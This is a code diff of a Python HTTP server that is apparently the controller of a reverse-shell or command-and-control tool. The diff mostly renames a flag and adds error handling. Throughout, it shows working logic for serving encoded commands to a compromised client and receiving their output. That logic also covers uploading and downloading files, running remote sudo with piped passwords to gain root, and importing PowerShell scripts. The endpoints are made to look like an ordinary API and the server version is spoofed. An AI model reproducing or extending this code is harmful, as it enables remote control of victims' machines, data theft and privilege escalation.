@@ -13,7 +13,7 @@ import neotermcolor
 from neotermcolor import colored
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-decoded_payload = True
+cmd_response = True
 sudo = False ; root = False
 command = None ; prompt = None
 local_path = None ; remote_path = None
@@ -76,7 +76,7 @@ class MyServer(BaseHTTPRequestHandler):
             pass
 
     def do_GET(self):
-        global decoded_payload
+        global cmd_response
         global wait_for_cmd ; global root
         global prompt ; global first_run ; global sudo
         global local_path ; global remote_path ; global command 
@@ -84,13 +84,15 @@ class MyServer(BaseHTTPRequestHandler):
         self.sys_version = "(Ubuntu)"
         try:
             if self.path == "/api/v1/Client/Download":
-                with open(local_path, "rb") as file:
-                    file_content = file.read()
-                    encoded_file = "File: "
-                    encoded_file += self.encode_file_revbase64url(file_content)
-                    self._set_headers()
-                    self.wfile.write(encoded_file.encode("utf-8"))
-                    return
+                try:
+                    with open(local_path, "rb") as filename:
+                        file_content = filename.read()
+                        encoded_file = "File: "
+                        encoded_file += self.encode_file_revbase64url(file_content)
+                        self._set_headers()
+                        self.wfile.write(encoded_file.encode("utf-8"))
+                except:
+                    print(colored(f"[!] Error reading \"{filename}\" file!\n", "red"))
 
             elif self.path == "/api/v1/Client/Token":
                 if root:
@@ -114,7 +116,7 @@ class MyServer(BaseHTTPRequestHandler):
                 else:
                     cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
                 cinput += (colored(" ", "yellow"))
-                if decoded_payload:  
+                if cmd_response:  
                     command = input(cinput + "\001\033[0m\002")
                     split_cmd = command.split()
 
@@ -135,14 +137,14 @@ class MyServer(BaseHTTPRequestHandler):
 
                 if command == "clear" or command == "cls":
                     os.system("clear")
-                    pass
+                    command = None
 
                 if "sudo" in command.split()[0]:
                     if not ":" in path:
                         args = oslex.split(command)
                         if len(args) < 2:
-                            print(colored("[!] Usage: sudo command or sudo su\n","red"))
-                            pass
+                            print(colored("[!] Usage: sudo \"command\" or sudo su\n","red"))
+                            command = None
                         else:
                             if not sudo:
                                 old_cmd = ' '.join(args[1:])
@@ -163,38 +165,36 @@ class MyServer(BaseHTTPRequestHandler):
                 if "upload" in command.split()[0]:
                     args = oslex.split(command)
                     if len(args) < 3 or len(args) > 3:
-                        print(colored("[!] Usage: upload local_file remote_file\n","red"))
-                        pass
+                        print(colored("[!] Usage: upload \"local_file\" \"remote_file\"\n","red"))
+                        command = None
                     else:
                         local_path = args[1]
                         remote_path = args[2]
                         command = "upload " + args[1] + "!" + args[2]
-                        print(colored(f"[+] Uploading {local_path} in {remote_path}..\n","green"))
+                        print(colored(f"[+] Uploading {local_path} in {remote_path}..","green"))
 
                 if "download" in command.split()[0]:
                     args = oslex.split(command)
                     if len(args) < 3 or len(args) > 3:
-                        print(colored("[!] Usage: download local_file remote_file\n","red"))
-                        pass
-
+                        print(colored("[!] Usage: download \"local_file\" \"remote_file\"\n","red"))
+                        command = None
                     else:
                         remote_path = args[1]
                         local_path = args[2]
                         command = "download " + args[1] + "!" + args[2]
-                        print(colored(f"[+] Downloading {remote_path} in {local_path}..\n","green"))
+                        print(colored(f"[+] Downloading {remote_path} in {local_path}..","green"))
 
                 if "import-ps1" in command.split()[0]:
                     args = oslex.split(command)
                     if len(args) < 2 or len(args) > 2:
-                        print(colored("[!] Usage: import-ps1 /path/script.ps1\n", "red"))
-                        pass 
-                    
+                        print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
+                        command = None
                     else:  
                         try:
                             filename = args[1]
                             with open(filename, "rb") as f:
                                 command = f.read().decode()
-                                print(colored(f"[!] File {filename} imported successfully!", "green"))
+                                print(colored(f"[!] File \"{filename}\" imported successfully!", "green"))
 
                         except FileNotFoundError:
                             print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
@@ -208,7 +208,7 @@ class MyServer(BaseHTTPRequestHandler):
                     print(colored("    clear/cls: Clear terminal screen","blue"))
                     print(colored("    kill: Kill client connection","blue"))
                     print(colored("    exit: Exit from program\n","blue"))
-                    pass
+                    command = None
 
                 if command is not None:
                     if root and not "cd" in command:
@@ -217,7 +217,7 @@ class MyServer(BaseHTTPRequestHandler):
                             command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
 
                     first_run = False
-                    decoded_payload = False
+                    cmd_response = False
                     encoded_command = "Token: "
                     encoded_command += self.encode_reversed_base64url(command)
                     self._set_headers()
@@ -238,10 +238,10 @@ class MyServer(BaseHTTPRequestHandler):
         except(AttributeError, UnboundLocalError, BrokenPipeError, ConnectionResetError, IndexError, TypeError):
             pass
 
-        return first_run, command, wait_for_cmd, sudo, root
+        return first_run, command, wait_for_cmd, sudo, root, cmd_response
 
     def do_POST(self):
-        global decoded_payload
+        global cmd_response
         global wait_for_cmd ; global root
         global prompt ; global first_run ; global sudo
         global local_path ; global remote_path ; global command 
@@ -263,16 +263,18 @@ class MyServer(BaseHTTPRequestHandler):
                 self.wfile.write(response.encode())
 
             elif self.path == "/api/v1/Client/Upload":
-                with open(local_path, "wb") as f:
-                    file_content = self.decode_file_revbase64url(encoded_payload)
-                    f.write(file_content)
-                    self.wfile.write(response.encode())
-                return
+                try:
+                    with open(local_path, "wb") as filename:
+                        file_content = self.decode_file_revbase64url(encoded_payload)
+                        filename.write(file_content)
+                        self.wfile.write(response.encode())
+                except:
+                    print(colored(f"[!] Error writing \"{filename}\" file!\n", "red"))
 
             elif self.path == "/api/v1/Client/Debug":
                 if not first_run and command is not None:
+                    cmd_response = True
                     if decoded_payload == "" or not decoded_payload:
-                        first_run = True
                         print()
                     else:
                         lines = decoded_payload.split("\n")
@@ -299,8 +301,8 @@ class MyServer(BaseHTTPRequestHandler):
 
             elif self.path == "/api/v1/Client/Error":
                 if not first_run and command is not None:
+                    cmd_response = True
                     if decoded_payload == "" or not decoded_payload:
-                        first_run = True
                         print()
                     else:
                         lines = decoded_payload.split("\n")
@@ -350,7 +352,7 @@ class MyServer(BaseHTTPRequestHandler):
         except:
             pass
 
-        return prompt, decoded_payload
+        return prompt, cmd_response
 
     def log_message(self, format, *args):
             pass
